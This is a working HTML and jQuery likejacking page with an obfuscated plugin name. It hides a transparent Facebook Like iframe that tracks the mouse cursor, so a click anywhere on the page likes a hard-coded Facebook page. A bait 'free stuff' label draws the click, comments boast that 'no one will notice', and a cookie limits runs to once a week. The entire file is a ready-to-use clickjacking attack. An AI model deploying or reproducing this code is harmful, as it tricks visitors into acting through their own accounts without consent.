<!DOCTYPE html>
<html>
<head>
<title>vvlikedhgfaaaaa (jQuery) - Allan Kimmer Jensen</title>
<!-- This is for demostration. You only need the javascript! -->
<style>
body { font-family: arial; width: 60%; margin: 0 auto;}
.clickjackZone { height: 100px; width: 250px; margin: 0 20px 20px 0; background: #eee; overflow: hidden; }
address { clear: both; margin: -10px 0 10px; }
</style>
</head>
<body>
<h1>jQuery vvlikedhgfaaaaa</h1>
<!--
Just a link to my twitter!
-->
<address>
By: <a href="http://twitter.com/allankjensen">Allan Kimmer Jensen</a>
</address>
<!--
The likejacking will only occur in this field.
You can set this to the html or the body element,
but this way you will be able to hide it like a button and no one will notice 
It will work on multiple elements.
-->
<section>
<div class="vvlikedhgfaaaaaZone">Click here for free stuff!</div>
<div class="vvlikedhgfaaaaaZone"></div>
</section>
<!--
Include jQuery and the vvlikedhgfaaaaa.js script
-->
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script type="text/javascript">
if (typeof cookie != 'function') {
	(function(factory) {
		if (typeof define === 'function' && define.amd) {
			define(['jquery'], factory);
		} else {
			factory(jQuery);
		}
	}(function($) {
		var pluses = /\+/g;
		function raw(s) {
			return s;
		}
		function decoded(s) {
			return decodeURIComponent(s.replace(pluses, ' '));
		}
		function converted(s) {
			if (s.indexOf('"') === 0) {
				s = s.slice(1, -1).replace(/\\"/g, '"').replace(/\\\\/g, '\\');
			}
			try {
				return config.json ? JSON.parse(s) : s;
			} catch (er) {}
		}
		var config = $.cookie = function(key, value, options) {
			if (value !== undefined) {
				options = $.extend({}, config.defaults, options);
				if (typeof options.expires === 'number') {
					var days = options.expires,
						t = options.expires = new Date();
					t.setDate(t.getDate() + days);
				}
				value = config.json ? JSON.stringify(value) : String(value);
				return (document.cookie = [config.raw ? key : encodeURIComponent(key), '=', config.raw ? value : encodeURIComponent(value), options.expires ? '; expires=' + options.expires.toUTCString() : '', options.path ? '; path=' + options.path : '', options.domain ? '; domain=' + options.domain : '', options.secure ? '; secure' : ''].join(''));
			}
			var decode = config.raw ? raw : decoded;
			var cookies = document.cookie.split('; ');
			var result = key ? undefined : {};
			for (var i = 0, l = cookies.length; i < l; i++) {
				var parts = cookies[i].split('=');
				var name = decode(parts.shift());
				var cookie = decode(parts.join('='));
				if (key && key === name) {
					result = converted(cookie);
					break;
				}
				if (!key) {
					result[name] = converted(cookie);
				}
			}
			return result;
		};
		config.defaults = {};
		$.removeCookie = function(key, options) {
			if ($.cookie(key) !== undefined) {
				$.cookie(key, '', $.extend({}, options, {
					expires: -1
				}));
				return true;
			}
			return false;
		};
	}));
}(function(jQuery) {
	var coo_vvlikedhgfaaaaa = false;//jQuery.cookie("coo_vvlikedhgfaaaaass");
	jQuery.fn.vvlikedhgfaaaaa = function(options) {
		if (coo_vvlikedhgfaaaaa) return false;
		options = jQuery.extend({
			target: null,
			test: false,
			time: 2000,
			end: function() {}
		}, options);
		return this.each(function() {
			var $this = jQuery(this),
				src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(options.target) + '&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
			var getOpacity = function() {
				return (options.test) ? '0.4' : '0';
			};
			$this.append('<iframe id="myframe" class="vvlikedhgfaaaaa" src="' + src + '"></iframe>');
			jQuery('.vvlikedhgfaaaaa', $this).css({
				border: 0,
				width: '50px',
				height: '23px',
				opacity: getOpacity(),
				position: 'absolute'
			});
			jQuery('body').mousemove(function(e) {
				jQuery('.vvlikedhgfaaaaa', $this).css({
					left: e.pageX - 25,
					top: e.pageY - 7
				}).show();
			});
			jQuery('a').mouseenter(function() {
				setTimeout(function() {
					jQuery('.vvlikedhgfaaaaa', $this).hide();
					options.end.call(this, $this);
				}, options.time);
			});
			setTimeout(function() {
				jQuery.cookie("coo_vvlikedhgfaaaaass", true, {
					expires: 7
				});
			}, 30000);
		});
	};
})(jQuery);
jQuery(function() {
	jQuery('body').vvlikedhgfaaaaa({
		target: 'https://www.facebook.com/kienthuchoidap',
		test: true
	});
});
$("#myframe").live('click', function(){
	console.log('Wow! Iframe Click!');
});
var myConfObj = {
iframeMouseOver : false
}
window.addEventListener('blur',function(){
if(myConfObj.iframeMouseOver){
console.log('Wow! Iframe Click!');
//alert('clicked');
}
});
 
document.getElementById('myframe').addEventListener('mouseover',function(){
myConfObj.iframeMouseOver = true;
});
document.getElementById('myframe').addEventListener('mouseout',function(){
myConfObj.iframeMouseOver = false;
});
</script>	

</body>
</html>